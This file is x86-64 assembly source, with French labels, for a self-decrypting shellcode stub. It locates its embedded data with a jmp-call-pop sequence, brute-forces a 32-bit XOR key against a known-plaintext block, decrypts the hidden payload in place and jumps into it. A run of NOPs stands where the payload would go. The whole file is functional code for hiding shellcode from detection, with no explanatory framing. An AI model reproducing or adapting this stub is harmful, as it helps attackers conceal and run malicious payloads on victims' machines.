BITS 64

jmp    SHORT saut_intermediaire

bloc0:
push   rbp
mov    rbp,rsp
sub    rsp,48
mov    rdi,QWORD [rbp+32]

bloc1:
mov    rsi,QWORD [rbp+24]
xor    rax,rax
mov    QWORD [rbp-8],rax

bloc2:
mov    rcx,rax
and    rcx,0x3
add    rcx,rcx
add    rcx,rcx
add    rcx,rcx
mov    rbx,rdx
sar    rbx,cl
mov    cl,bl
xor    rbx,rbx
cmp    QWORD [rbp+40],rbx
jne    decode

movzx  rbx,BYTE [rsi]
movzx  rcx,cl
xor    rbx,rcx
mov    rcx,QWORD [rbp+16]
movzx  rcx,BYTE [rax+rcx]
cmp    rbx,rcx
jne    incr

inc    QWORD [rbp-8]
jmp    incr

saut_intermediaire:
jmp SHORT main_shellcode
	   
decode: 
xor    BYTE [rsi],cl

incr:	    
inc    rax
inc    rsi
cmp    rax,rdi
jl     bloc2
			    
cmp    rdi,QWORD [rbp-8]
je     copie_cle
			    
cmp    QWORD [rbp+40],0x1
je     bloc10
			    
inc    edx
cmp    edx,0xffffffff
jb     bloc1

bloc10:		    
xor    rax,rax
jmp    bloc12

copie_cle:
mov    rax,rdx

bloc12:		    
leave
ret
			    
main_shellcode:			    
push   rbp
mov    rbp,rsp
sub    rsp,32
jmp    ref_chiffre

main_shell_bis:		    
pop    rax
mov    QWORD [rbp-8],rax
jmp    clair_ref

main_shell_ter:		    
pop    rax
mov    rdx,QWORD [rax]
mov    QWORD [rbp-16],rdx
add    rax,0x8
mov    QWORD [rbp-24],rax
xor    rbx,rbx
xor    rax,rax
push   rax
push   0xa
push   QWORD [rbp-8]
push   QWORD [rbp-24]
call   bloc0
			    
test   rax,rax
je     fin_main
			    
push   0x1 
push   QWORD [rbp-16]
push   QWORD [rbp-8]
push   QWORD [rbp-24]
call   bloc0
			    
jmp    QWORD [rbp-8]

fin_main:		    
leave
ret
			    
clair_ref:
call   main_shell_ter

nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
	    
ref_chiffre:
call   main_shell_bis